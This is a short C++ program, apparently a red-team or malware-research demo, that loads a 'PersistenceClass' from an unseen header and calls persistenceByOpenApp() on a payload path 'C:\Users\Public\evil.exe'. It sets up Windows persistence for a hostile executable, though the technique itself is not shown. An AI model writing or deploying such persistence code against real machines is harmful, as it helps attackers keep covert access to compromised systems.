#include <windows.h>
#include <iostream>
#include "PersistenceClass.h"
 
using namespace std;
 
int main(int argc, char *argv[]){
    PersistenceClass persistence = PersistenceClass("C:\\Users\\Public\\evil.exe");
    persistence.persistenceByOpenApp();
    return 0;
}